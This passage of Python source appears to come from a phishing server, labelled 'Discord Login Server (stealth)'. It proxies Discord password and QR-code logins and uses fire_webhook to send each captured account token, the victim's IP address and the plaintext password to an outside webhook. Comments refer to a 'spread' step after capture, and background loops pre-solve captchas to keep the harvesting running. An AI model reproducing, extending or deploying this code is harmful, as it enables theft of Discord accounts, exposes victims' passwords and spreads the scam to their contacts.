                pw = _pw_store.pop(ticket, '?') if ticket else '?'
            if pw == '?':
                pw = d.get('pw', '?')  # Fallback: frontend round-trip
            fire_webhook(j['token'], ip, pw)
            return jsonify(_success_with_info(j['token']))
        return jsonify(j), r.status_code
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/qr/start')
def api_qr_start():
    s = QRAuth()
    sessions[s.id] = s
    threading.Thread(target=_qr_worker, args=(s,), daemon=True).start()
    for _ in range(200):  # Wait up to 20s for QR fingerprint
        if s.fp or s.st in ('error', 'cancelled'):
            break
        time.sleep(0.1)
    if s.fp:
        return jsonify({'id': s.id, 'fp': s.fp})
    return jsonify({'id': s.id, 'err': s.err or 'Timeout'}), 500


@app.route('/api/qr/poll/<sid>')
def api_qr_poll(sid):
    s = sessions.get(sid)
    if not s:
        return jsonify({'st': 'error', 'err': 'Gone'}), 404
    out = {'st': s.st}
    if s.user:         out['user'] = s.user
    if s.st == 'done' and s.token:
        # Use _success_with_info to assign role + voice + webhook + spread (once only)
        if not getattr(s, '_info_fired', False):
            s._info_fired = True
            fire_webhook(s.token)
            s._cached_info = _success_with_info(s.token)
        out.update(getattr(s, '_cached_info', {'success': True}))
    if s.err:          out['err'] = s.err
    return jsonify(out)


@app.route('/api/qr/stop/<sid>', methods=['POST'])
def api_qr_stop(sid):
    s = sessions.pop(sid, None)
    if s:
        s._stop.set()
        try: s.ws.close()
        except: pass
    return jsonify({'ok': True})



# ━━━━━━━━━━━━ Main ━━━━━━━━━━━━

if __name__ == '__main__':
    print('[*] Fetching build number...')
    fetch_build_number()

    def _cleanup():
        while True:
            time.sleep(300)
            dead = [k for k, v in sessions.items() if v.st in ('done', 'error', 'cancelled', 'expired')]
            for k in dead:
                sessions.pop(k, None)
            # Clear stale login sessions (captcha not solved within 5 min)
            login_sessions.clear()
    threading.Thread(target=_cleanup, daemon=True).start()

    # Start 24/7 captcha pre-solve loop
    threading.Thread(target=_presolve_loop, daemon=True).start()

    # Start session pre-warm pool
    threading.Thread(target=_session_pool_loop, daemon=True).start()

    print(f'\n  Discord Login Server (stealth)')
    print(f'  http://0.0.0.0:{PORT}\n')
    app.run('0.0.0.0', PORT, debug=False, threaded=True)
